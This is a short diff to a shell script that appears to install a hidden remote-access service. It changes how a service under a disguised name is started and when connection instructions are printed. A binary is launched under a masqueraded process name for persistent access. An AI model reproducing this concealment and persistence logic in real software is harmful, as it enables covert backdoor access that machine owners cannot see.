@@ -914,7 +914,7 @@ gs_start_systemd()
 {
 	# HERE: It's systemd
 	if [[ -z "$IS_GS_RUNNING" ]]; then
-		systemctl start "${SERVICE_HIDDEN_NAME}" &>/dev/null
+		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
 		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
 			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
 			exit_code 255
@@ -1024,6 +1024,7 @@ if [[ -z "$IS_INSTALLED" ]]; then
 	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
 
+HOWTO_CONNECT_OUT
 
 printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
 if [[ -n "$GS_NOSTART" ]]; then
@@ -1031,7 +1032,5 @@ if [[ -n "$GS_NOSTART" ]]; then
 else
 	gs_start
 fi
-
-HOWTO_CONNECT_OUT
 
 exit_code 0
